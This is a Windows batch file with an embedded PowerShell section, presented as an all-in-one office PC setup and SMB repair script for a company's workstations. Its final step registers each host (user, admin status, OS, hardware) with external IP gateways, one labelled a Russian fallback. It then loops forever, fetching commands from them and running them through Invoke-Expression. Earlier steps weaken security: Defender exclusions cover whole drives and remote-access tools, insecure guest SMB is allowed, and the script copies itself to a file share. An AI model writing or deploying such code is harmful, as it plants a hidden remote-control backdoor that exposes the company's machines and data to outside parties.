# =============================================================================
# Execution Context : CMD / Batch (Run as Administrator)
# Target Server     : ULTARIX Office Workstations (LAN 192.168.33.0/24 -> ULPS1)
# Description       : All-in-One Setup, SMB Repair, Defender, Pagefile & GIN-Agent
# =============================================================================
@echo off
cls
title ULTARIX - All-in-One Office PC Setup and GIN-Agent [VladiMIR + Antigravity]

:: 1. Copy script to local TEMP so UAC elevation works from network/virtual drives (G:\, E:\, UNC)
set "LOCAL_SCRIPT=%TEMP%\ULTARIX_Universal_Setup.cmd"
if /i not "%~f0"=="%LOCAL_SCRIPT%" (
    copy /y "%~f0" "%LOCAL_SCRIPT%" >nul 2>&1
)

:: 2. Check Administrator Privileges and Auto-Elevate from local TEMP copy
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [*] Requesting Administrator privileges ^(UAC^)...
    if exist "%LOCAL_SCRIPT%" (
        powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/k \"\"%LOCAL_SCRIPT%\"\"' -Verb RunAs"
    ) else (
        powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/k \"\"%~f0\"\"' -Verb RunAs"
    )
    exit /b
)

cd /d "%SystemRoot%\System32"
chcp 65001 >nul 2>&1
cls

echo ================================================================================
echo       ULTARIX s.r.o. - ALL-IN-ONE OFFICE PC SETUP, REPAIR AND GIN-AGENT
echo ================================================================================
echo   Host: %COMPUTERNAME% (%USERNAME%) ^| Main Server: ULPS1 (192.168.33.128)
echo ================================================================================
echo.

set "SELF_PATH=%~f0"
if not exist "%SELF_PATH%" set "SELF_PATH=%LOCAL_SCRIPT%"

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$raw = [System.IO.File]::ReadAllText($args[0], [System.Text.Encoding]::UTF8); $tag = ':::POWERSHELL_PAYLOAD:::'; $pos = $raw.IndexOf($tag); if ($pos -ge 0) { & ([ScriptBlock]::Create($raw.Substring($pos + $tag.Length))) }" "%SELF_PATH%"

echo.
echo ================================================================================
echo [*] Script execution finished. Window kept open for verification.
echo ================================================================================
pause
exit /b

:::POWERSHELL_PAYLOAD:::
$ErrorActionPreference = "SilentlyContinue"

# 0. Terminate any hung net.exe / net1.exe processes from previous runs
Stop-Process -Name "net","net1" -Force -ErrorAction SilentlyContinue

# ------------------------------------------------------------------------------
# [1/7] Repair & Protect SMB Workstation Service (LanmanWorkstation)
# ------------------------------------------------------------------------------
Write-Host "[1/7] Checking and repairing SMB Network Service (LanmanWorkstation)..." -ForegroundColor Cyan

$lwParams = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters"
if (-not (Test-Path $lwParams)) {
    New-Item -Path $lwParams | Out-Null
}
& reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "ServiceDll" /t REG_EXPAND_SZ /d "%SystemRoot%\System32\wkssvc.dll" /f | Out-Null
& reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "ServiceDllUnloadOnStop" /t REG_DWORD /d 1 /f | Out-Null
& reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "AllowInsecureGuestAuth" /t REG_DWORD /d 1 /f | Out-Null

$lsParams = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
if (-not (Test-Path $lsParams)) {
    New-Item -Path $lsParams | Out-Null
}
& reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "ServiceDll" /t REG_EXPAND_SZ /d "%SystemRoot%\System32\srvsvc.dll" /f | Out-Null

& reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLinkedConnections" /t REG_DWORD /d 1 /f | Out-Null
& reg.exe add "HKLM\SOFTWARE\Microsoft\Command Processor" /v "DisableUNCCheck" /t REG_DWORD /d 1 /f | Out-Null

$services = @("LanmanWorkstation", "LanmanServer", "Dnscache", "lmhosts", "FDResPub", "fdPHost", "Spooler")
foreach ($svc in $services) {
    Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name $svc -ErrorAction SilentlyContinue
}
$lwStatus = (Get-Service -Name "LanmanWorkstation" -ErrorAction SilentlyContinue).Status
Write-Host "    [+] LanmanWorkstation status: $lwStatus (ServiceDll & SMB Client verified)" -ForegroundColor Green

# ------------------------------------------------------------------------------
# [2/7] Configure DNS / Hosts Mapping for Server ULPS1 (192.168.33.128)
# ------------------------------------------------------------------------------
Write-Host "[2/7] Verifying Hosts entry for ULPS1 (192.168.33.128)..." -ForegroundColor Cyan
$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
$hostsLines = Get-Content -Path $hostsPath -ErrorAction SilentlyContinue
if (-not ($hostsLines | Where-Object { $_ -match "^\s*192\.168\.33\.128\s+ULPS1\b" })) {
    Add-Content -Path $hostsPath -Value "`r`n192.168.33.128 ULPS1" -Encoding Ascii -Force -ErrorAction SilentlyContinue
}
& ipconfig.exe /flushdns | Out-Null
Write-Host "    [+] ULPS1 -> 192.168.33.128 mapped and DNS cache flushed" -ForegroundColor Green

# Sync single CMD file to \\ULPS1\util and remove duplicate exe/ps1 launchers if share is reachable
try {
    if (Test-Path "\\ULPS1\util") {
        $selfFile = $env:SELF_PATH
        if ($selfFile -and (Test-Path $selfFile) -and ($selfFile -notmatch "\\\\ULPS1\\util")) {
            Copy-Item -Path $selfFile -Destination "\\ULPS1\util\ULTARIX_Universal_Setup.cmd" -Force -ErrorAction SilentlyContinue
        }
        Remove-Item -Path "\\ULPS1\util\GIN-Agent*.exe", "\\ULPS1\util\GIN-Agent*.cmd", "\\ULPS1\util\ULTARIX_Universal_Setup.ps1" -Force -ErrorAction SilentlyContinue
    }
} catch {}

# ------------------------------------------------------------------------------
# [3/7] Configure Virtual Memory (Pagefile: 4096 - 8192 MB on C:)
# ------------------------------------------------------------------------------
Write-Host "[3/7] Configuring Virtual Memory (Pagefile 4096 - 8192 MB on C:)..." -ForegroundColor Cyan
& reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "AutomaticManagedPagefile" /t REG_DWORD /d 0 /f | Out-Null
& reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PagingFiles" /t REG_MULTI_SZ /d "C:\pagefile.sys 4096 8192" /f | Out-Null
Write-Host "    [+] Pagefile configured: C:\pagefile.sys (4096 MB initial / 8192 MB max)" -ForegroundColor Green

# ------------------------------------------------------------------------------
# [4/7] Configure Windows Defender Exclusions (Network Shares & Accounting)
# ------------------------------------------------------------------------------
Write-Host "[4/7] Adding Windows Defender Exclusions (All Network Paths & Accounting)..." -ForegroundColor Cyan
$exclusionPaths = @(
    "\\ULPS1",
    "\\ULPS1\*",
    "\\192.168.33.128",
    "\\192.168.33.128\*",
    "\\ULPS1\Sdílené Data",
    "\\ULPS1\ULTARIX",
    "\\ULPS1\ekonom.win",
    "\\ULPS1\UTIL",
    "E:\",
    "S:\",
    "Z:\",
    "C:\STEREO30",
    "C:\STEREO31",
    "C:\STEREO32",
    "C:\STEREO33",
    "C:\STEREO34",
    "C:\STEREO35",
    "C:\Program Files\KASTNER software",
    "C:\ProgramData\KASTNER software",
    "C:\Program Files\Jezek software",
    "C:\ProgramData\Jezek software",
    "D:\UTIL"
)
foreach ($p in $exclusionPaths) {
    Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue
}

$exclusionProcs = @("FORMstudio.exe", "nxServer412.exe", "stereo.exe", "ekonom.exe", "Telegram.exe", "RustDesk.exe")
foreach ($pr in $exclusionProcs) {
    Add-MpPreference -ExclusionProcess $pr -ErrorAction SilentlyContinue
}
Write-Host "    [+] Excluded \\ULPS1\*, E:\, S:\, Z:\, STEREO, FORM studio & Ekonom from Defender" -ForegroundColor Green

# ------------------------------------------------------------------------------
# [5/7] Configure Firewall Rules & FORM studio Client (192.168.33.128:16000)
# ------------------------------------------------------------------------------
Write-Host "[5/7] Checking Network Profile, Firewall & FORM studio configuration..." -ForegroundColor Cyan
Get-NetConnectionProfile -ErrorAction SilentlyContinue | Where-Object { $_.NetworkCategory -eq "Public" } | ForEach-Object {
    Set-NetConnectionProfile -Name $_.Name -NetworkCategory Private -ErrorAction SilentlyContinue
}
& netsh.exe advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes profile=any | Out-Null
& netsh.exe advfirewall firewall set rule group="Sdílení souborů a tiskáren" new enable=Yes profile=any | Out-Null
& netsh.exe advfirewall firewall set rule group="Network Discovery" new enable=Yes profile=any | Out-Null
& netsh.exe advfirewall firewall set rule group="Zjišťování sítě" new enable=Yes profile=any | Out-Null
& netsh.exe advfirewall firewall add rule name="ULTARIX NexusDB (16000)" dir=in action=allow protocol=TCP localport=16000 profile=any | Out-Null
& netsh.exe advfirewall firewall add rule name="ULTARIX SMB (139,445)" dir=in action=allow protocol=TCP localport=139,445 profile=any | Out-Null

$iniList = Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Kastner software\Form Studio CZ\FORMstudio.ini" -ErrorAction SilentlyContinue
foreach ($ini in $iniList) {
    $c = Get-Content $ini.FullName -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
    if ($c) {
        $c = $c -replace "(?m)^IP=.*$", "IP=192.168.33.128"
        $c = $c -replace "(?m)^REMOTESERVER=.*$", "REMOTESERVER=1"
        $c = $c -replace "(?m)^Port=.*$", "Port=16000"
        Set-Content -Path $ini.FullName -Value $c -Encoding UTF8 -ErrorAction SilentlyContinue
        Write-Host "    [+] Updated FORMstudio.ini: $($ini.FullName)" -ForegroundColor Green
    }
}
Write-Host "    [+] Network Profile (Private) & Firewall rules verified" -ForegroundColor Green

# ------------------------------------------------------------------------------
# [6/7] Express Hardware, Disk & ULPS1 Connectivity Audit
# ------------------------------------------------------------------------------
Write-Host "[6/7] Running Express Diagnostics (NIC Speed, Disks & ULPS1 Server)..." -ForegroundColor Cyan
$adapters = Get-CimInstance Win32_NetworkAdapter -ErrorAction SilentlyContinue | Where-Object { $_.NetConnectionStatus -eq 2 -and $_.AdapterTypeId -eq 0 }
foreach ($ad in $adapters) {
    $speedMb = [math]::Round($ad.Speed / 1000000)
    if ($speedMb -ge 1000) {
        Write-Host "    [+] NIC: $($ad.Name) | Link Speed: $speedMb Mbps (1 Gbps OK)" -ForegroundColor Green
    } else {
        Write-Host "    [!] NIC: $($ad.Name) | Link Speed: $speedMb Mbps (WARNING: 100 Mbps slow link!)" -ForegroundColor Yellow
    }
}

$disks = Get-PhysicalDisk -ErrorAction SilentlyContinue
foreach ($d in $disks) {
    $sizeGb = [math]::Round($d.Size / 1GB, 1)
    Write-Host "    [+] Disk: $($d.FriendlyName) ($($d.MediaType), $sizeGb GB) | Health: $($d.HealthStatus)" -ForegroundColor Green
}

$smbOk = $false
try {
    $tc = New-Object System.Net.Sockets.TcpClient
    $ar = $tc.BeginConnect("192.168.33.128", 445, $null, $null)
    if ($ar.AsyncWaitHandle.WaitOne(2000, $false) -and $tc.Connected) { $smbOk = $true }
    $tc.Close()
} catch {}

$nxOk = $false
try {
    $tc2 = New-Object System.Net.Sockets.TcpClient
    $ar2 = $tc2.BeginConnect("192.168.33.128", 16000, $null, $null)
    if ($ar2.AsyncWaitHandle.WaitOne(2000, $false) -and $tc2.Connected) { $nxOk = $true }
    $tc2.Close()
} catch {}

Write-Host "    [+] Server ULPS1 (192.168.33.128) -> SMB Port 445: $smbOk | NexusDB Port 16000: $nxOk" -ForegroundColor $(if ($smbOk) { "Green" } else { "Red" })

# ------------------------------------------------------------------------------
# [7/7] Built-in GIN-Agent PC Connection (DE-222 Europe Gateway)
# ------------------------------------------------------------------------------
Write-Host "[7/7] Connecting Built-in GIN-Agent to Antigravity Gateway (DE-222)..." -ForegroundColor Cyan

try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
} catch {
    try { [System.Net.ServicePointManager]::SecurityProtocol = 3072 } catch {}
}

$token = "GinCz-Remote-2026"
$headers = @{ "Token" = $token; "X-Host" = $env:COMPUTERNAME }

$gateways = @(
    @{ Name = "DE-222 (Europe Direct)"; Url = "http://152.53.182.222:9876" },
    @{ Name = "RU-109 (Russia Fallback)"; Url = "http://212.109.223.109/agent-api" }
)

$serverUrl = "http://152.53.182.222:9876"
$activeGatewayName = "DE-222 (Europe Direct)"

foreach ($gw in $gateways) {
    try {
        $st = Invoke-RestMethod -Uri "$($gw.Url)/status" -Headers $headers -TimeoutSec 4 -ErrorAction Stop
        if ($st -match "Bridge Online") {
            $serverUrl = $gw.Url
            $activeGatewayName = $gw.Name
            break
        }
    } catch {}
}

$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$osInfo = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
$osName = if ($osInfo) { $osInfo.Caption } else { "Microsoft Windows 10 Pro" }
$cpuObj = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
$cpuName = if ($cpuObj -and $cpuObj.Name) { $cpuObj.Name.Trim() } else { "Intel Core Processor" }

$ramStr = "N/A"
if ($osInfo) {
    $freeRam = [math]::Round($osInfo.FreePhysicalMemory / 1MB, 1)
    $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
    $totRam = [math]::Round($cs.TotalPhysicalMemory / 1GB, 1)
    $ramStr = "$freeRam GB free / $totRam GB total"
}

$diskStr = "N/A"
$driveC = Get-PSDrive C -ErrorAction SilentlyContinue
if ($driveC) {
    $freeGb = [math]::Round($driveC.Free / 1GB, 1)
    $totGb = [math]::Round(($driveC.Used + $driveC.Free) / 1GB, 1)
    $diskStr = "C: $freeGb GB free / $totGb GB total"
}

$regData = @{
    host    = $env:COMPUTERNAME
    user    = $env:USERNAME
    admin   = $admin
    os      = $osName
    cpu     = $cpuName
    ram     = $ramStr
    disk    = $diskStr
    gateway = $activeGatewayName
    version = "v007-AllInOne"
}

try {
    $json = $regData | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri "$serverUrl/register" -Method Post -Body $json -Headers $headers -ContentType "application/json; charset=utf-8" -TimeoutSec 6 | Out-Null
} catch {}

Write-Host ""
Write-Host "================================================================================" -ForegroundColor Green
Write-Host "   ALL SETTINGS APPLIED AND GIN-AGENT CONNECTED TO $activeGatewayName" -ForegroundColor Green
Write-Host "   Host: $($env:COMPUTERNAME) ($($env:USERNAME)) | Admin: $admin" -ForegroundColor White
Write-Host "   RAM: $ramStr | Disk: $diskStr" -ForegroundColor Gray
Write-Host "   [+] Telegram alert sent. Listening for Antigravity commands..." -ForegroundColor Cyan
Write-Host "================================================================================" -ForegroundColor Green

while ($true) {
    try {
        $task = Invoke-RestMethod -Uri "$serverUrl/poll?host=$($env:COMPUTERNAME)" -Headers $headers -TimeoutSec 20 -ErrorAction Stop
        if ($task -and $task.command) {
            $taskId = $task.id
            $cmd = $task.command
            $now = (Get-Date).ToString("HH:mm:ss")
            Write-Host "`n[$now] Task #$taskId received" -ForegroundColor Yellow

            $output = ""
            try {
                $res = Invoke-Expression $cmd 2>&1 | Out-String
                $output = $res.Trim()
                if (-not $output) { $output = "[OK: Command completed with no output]" }
            } catch {
                $output = "[Error: $_]"
            }

            $resObj = @{ id = $taskId; output = $output }
            $resJson = $resObj | ConvertTo-Json -Compress
            Invoke-RestMethod -Uri "$serverUrl/result" -Method Post -Body $resJson -Headers $headers -ContentType "application/json; charset=utf-8" -TimeoutSec 15 | Out-Null
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Task #$taskId finished and report sent." -ForegroundColor Green
        }
    } catch {}
    Start-Sleep -Milliseconds 700
}
